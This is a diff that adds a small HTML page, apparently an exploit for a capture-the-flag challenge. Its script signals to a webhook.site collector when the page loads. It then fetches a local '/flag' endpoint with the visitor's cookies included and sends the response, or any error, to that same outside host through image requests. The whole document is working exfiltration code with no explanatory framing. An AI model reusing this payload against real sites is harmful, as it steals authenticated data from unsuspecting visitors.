@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+new Image().src = 'https://webhook.site/showontest?ex2=loaded';
+
+setTimeout(function(){
+  fetch('http://localhost:3000/flag', {credentials: 'include'})
+    .then(r => r.text())
+    .then(f => {
+      new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(f);
+    })
+    .catch(e => {
+      new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+    });
+}, 500);
+</script>
+</body>
+</html>
